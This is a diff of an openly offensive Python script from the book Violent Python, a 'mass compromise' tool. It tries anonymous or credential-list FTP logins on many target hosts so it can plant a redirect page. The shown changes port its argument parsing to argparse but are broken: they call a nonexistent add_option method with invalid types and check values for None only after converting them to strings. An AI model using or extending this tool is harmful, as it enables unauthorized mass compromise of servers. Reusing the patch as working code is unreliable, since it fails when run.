@@ -1,7 +1,8 @@
 ''' mass compromise for chapter 2 of Violent Python'''
 import ftplib
-import optparse
+import argparse
 import time
+import sys
 
 def anonLogin(ip):
     ''' anonymous login'''
@@ -77,21 +78,21 @@ def attack(username, password, tgtHost, redirect):
 
 def main():
     ''' main function'''
-    parser = optparse.OptionParser('usage%prog ' + '-H <target host[s]> -r <redirect page> [-f <userpass file>]')
-    parser.add_option('-H', dest='tgtHosts', type='string', help='specify target host')
-    parser.add_option('-f', dest='passwdFile', type='string', help='specify user/password file')
-    parser.add_option('-r', dest='redirect', type='string', help='specify a redirection page')
-    (options, args) = parser.parse_args()
-    tgtHosts = str(options.tgtHosts).split(', ')
-    passwdFile = options.passwdFile
-    redirect = options.redirect
+    parser = argparse.ArgumentParser(usage='masscompromise.py -H <target host[s]> -r <redirect page> [-f <userpass file>]')
+    parser.add_option('-H', type='string', help='specify target host')
+    parser.add_option('-f', type='string', help='specify user/password file')
+    parser.add_option('-r', type='string', help='specify a redirection page')
+    args = parser.parse_args()
+    tgtHosts = str(args.H).split(', ')
+    passwdFile = str(args.f)
+    redirect = str(args.r)
     if tgtHosts is None or redirect is None:
         print(parser.usage)
-        exit(0)
+        sys.exit(0)
     for tgtHost in tgtHosts:
         username = None
         password = None
-        if anonLogin(tgtHost) == True:
+        if anonLogin(tgtHost) is True:
             username = 'anonymous'
             password = 'me@your.com'
             print('[+] Using Anonymous Creds to attack')
